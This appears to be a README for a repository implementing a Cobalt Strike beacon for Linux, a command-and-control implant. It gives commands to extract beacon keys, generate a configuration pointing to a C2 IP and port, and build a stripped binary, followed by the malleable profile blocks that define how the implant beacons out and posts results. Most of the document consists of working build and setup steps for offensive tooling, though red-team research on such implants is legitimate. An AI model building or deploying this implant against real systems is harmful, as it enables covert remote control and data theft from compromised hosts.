# [Be]acon for [Lin]ux

This repository contains a study and implementation of a Cobalt Strike beacon for linux based operation system.

Refer to [NOTES.md](NOTES.md) as more information about the project.

Extract the keys from `.cobaltstrike.beacon_keys` using the file under `cmd/KeyExt/`.

```
go run cmd/keyExt/main.go ./cobaltstrike.beacon_keys

-----BEGIN PUBLIC KEY-----
MIGfMA0G...
-----END PUBLIC KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0G...
-----END PUBLIC KEY-----
```

Or use the config gen to create a configuration file that must be placed within the folder `config`.

```bash
go run cmd/configGen/main.go -k ./cobaltstrike.beacon_keys -a <c2 ip>:<port> > config/config.go
```

Now build the binary.

```bash
go build -o name -ldflags="-s -w" cmd/main/main.go
```

Have in mind that this "beacon" will use the default CS malleable profile, placing the metadata in cookie and posting the response with the query string `id` as the session/beacon id.

```js
http-get {
	set uri "/load";

	client {
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
		output {
			print;
		}
	}
}
```

```js
http-post {
	set uri "/submit.php";
	client {
		header "Content-Type" "application/octet-stream";
		id {
			parameter "id";
		}
		output {
			print;
		}
	}
	server {
		header "Content-Type" "text/html";
		output {
			print;
		}
	}
}
```